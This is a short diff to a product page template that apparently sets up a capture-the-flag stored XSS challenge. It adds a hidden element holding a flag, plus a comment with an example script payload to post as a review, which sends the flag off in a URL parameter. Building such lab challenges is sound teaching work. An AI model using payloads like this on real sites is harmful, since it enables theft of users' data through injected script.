@@ -3,6 +3,13 @@
 {% block title %}{{ product.name }} | Helmaand{% endblock %}
 
 {% block content %}
+<!-- CTF: hidden flag element for stored XSS challenge.
+     The attacker's stored payload reads this via document.getElementById('ctf-flag').dataset.flag
+     Example attack payload (post as review comment):
+       <script>document.location='/?stolen='+document.getElementById('ctf-flag').dataset.flag</script>
+-->
+<div id="ctf-flag" data-flag="{{ ctf_flag }}" style="display:none;"></div>
+
 <div class="container py-5">
     <div class="row">
         <div class="col-md-6">
